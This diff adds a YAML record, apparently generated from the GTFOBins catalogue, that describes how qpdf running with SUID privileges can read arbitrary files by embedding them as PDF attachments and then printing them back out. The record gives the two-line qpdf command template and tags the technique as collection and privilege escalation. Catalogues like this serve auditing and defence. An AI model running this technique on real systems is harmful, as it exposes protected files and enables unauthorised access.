@@ -1,0 +1,81 @@
+id: gtfobins/qpdf/file-read/suid
+type: binary
+platform: linux
+name: qpdf
+phases:
+- collection
+- privilege-escalation
+capabilities:
+- file-read
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: 'qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file
+
+    qpdf --show-attachment=x /path/to/output-file'
+references:
+- https://gtfobins.github.io/gtfobins/qpdf/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        qpdf:
+          functions:
+            file-read:
+            - code: 'qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file
+
+                qpdf --show-attachment=x /path/to/output-file'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/qpdf/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-read
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: collection
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: suid
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:3bff85c4f111cac41c58f1ff006f15633533549ad29ea5f00203215e51928cda
